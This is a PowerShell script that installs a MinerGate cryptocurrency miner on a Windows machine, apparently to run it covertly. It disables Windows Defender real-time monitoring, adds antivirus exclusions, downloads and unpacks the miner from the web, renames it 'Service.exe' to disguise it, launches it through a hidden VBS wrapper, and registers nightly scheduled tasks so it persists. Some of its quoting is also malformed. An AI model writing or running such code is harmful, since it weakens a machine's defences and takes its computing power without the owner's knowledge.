# Variables

$Arc = if ([System.IntPtr]::Size -eq 4) { "32-Bit" } else { "64-Bit" }
$url = "https://download.minergate.com/win-cli"
$output = "C:\Mining\download.zip"
$destination = "C:\Mining"
$start_time = Get-Date
$StartAction = New-ScheduledTaskAction -Execute 'C:\Mining\MinerGate-cli-4.04-win64\Startup.vbs'
$StartTrigger =  New-ScheduledTaskTrigger -Daily -At 7pm
$KillAction = New-ScheduledTaskAction -Execute 'C:\Mining\MinerGate-cli-4.04-win64\Kill.vbs'
$KillTrigger =  New-ScheduledTaskTrigger -Daily -At 7am
$CPUQuery = ((get-counter "\Processor(*)\% idle time").countersamples | select instancename).length -1
$CPU = $CPUQuery / 2 # Get CPUs and divides it by 2 to allow computer to play normal

# Check machine if 64-bit. If it isn't cancel the script:

If ($Arc -eq "64-Bit") {
# Set Exceptions and Disable Windows Defender. 

Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -ExclusionPath ""C:\MiningP", "C:\Mining\MinerGate-cli-4.04-win64""
Set-MpPreference -ExclusionProcess "Service.exe"

# Download latest Minergate Application and Extract it, Renaming Minergate-cli.exe to Service.exe

New-Item -Path "C:\Mining" -ItemType directory
Invoke-WebRequest -Uri $url -OutFile $output
Expand-Archive -path $output -destinationpath $destination
Rename-Item C:\Mining\MinerGate-cli-4.04-win64\Minergate-cli.exe Service.exe

# Create .BAT File to Start Service

cd C:\Mining\MinerGate-cli-4.04-win64
"cd C:\Mining\MinerGate-cli-4.04-win64" | Out-File -encoding ascii BootDebug.bat
"Service -user "XXXXEMAILADDRESSXXXX" --xmr $CPU" | Out-File -encoding ascii BootDebug.bat -append

# Create .BAT File to Kill Service

"Taskkill /IM service.exe /F" | Out-File -encoding ascii Kill.bat

# Create VBS Script

"Dim WShell" | Out-File -encoding ascii Startup.vbs
{Set WShell = CreateObject("WScript.Shell")} | Out-File -encoding ascii Startup.vbs -append
{WShell.Run "C:\Mining\MinerGate-cli-4.04-win64\BootDebug.bat", 0} | Out-File -encoding ascii Startup.vbs -append
"Set WShell = Nothing" | Out-File -encoding ascii Startup.vbs -append

# Delete .ZIP File

Remove-Item $output

# Create Scheduled Start Task

Register-ScheduledTask -Action $StartAction -Trigger $StartTrigger -TaskName "Start_Minergate" -Description "Start Minergate"

# Create Scheduled Kill Task

Register-ScheduledTask -Action $KillAction -Trigger $KillTrigger -TaskName "Kill_Minergate" -Description "Kill Minergate"

.\Startup.vbs

}
